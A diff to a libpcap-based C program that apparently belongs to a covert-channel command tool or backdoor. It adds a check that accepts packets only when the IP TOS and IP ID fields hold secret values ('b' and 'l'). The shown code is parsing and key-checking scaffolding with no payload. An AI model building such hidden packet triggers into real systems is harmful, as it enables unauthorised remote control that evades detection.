@@ -34,7 +34,7 @@ void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* pack
 void ParsePayload(const u_char *payload, int len);
 void CreatePayload(char *command, unsigned char *encrypted);
 void SendPayload(const unsigned char *tcp_payload);
-
+bool CheckKey(u_char ip_tos, u_short ip_id);
 int main(int argc, char **argv){
     char *c = "c";
     if(strcmp(argv[1],c) == 0){
@@ -148,12 +148,24 @@ void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
         printf("Protocal: TCP\n");
         printf("IPID: %hu\n", ip->ip_id);
         printf("TOS: %u\n", ip->ip_tos);
-        ParseTCP(args, pkthdr, packet);
+        if(CheckKey(ip->ip_tos, ip->ip_id)){
+            ParseTCP(args, pkthdr, packet);
+        } else {
+            printf("Packet tossed wrong key\n");
+        }
     } else if((off & 0x1fff) == 0){
         printf("IP: %s\n", inet_ntoa(ip->ip_src));
         printf("%s %d %d %d %d\n", inet_ntoa(ip->ip_dst), hlen, version, len, off);
     }
 
+}
+
+bool CheckKey(u_char ip_tos, u_short ip_id){
+    if(ip_tos == 'b' && ip_id == 'l'){
+        return true;
+    } else {
+        return false;
+    }
 }
 
 void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
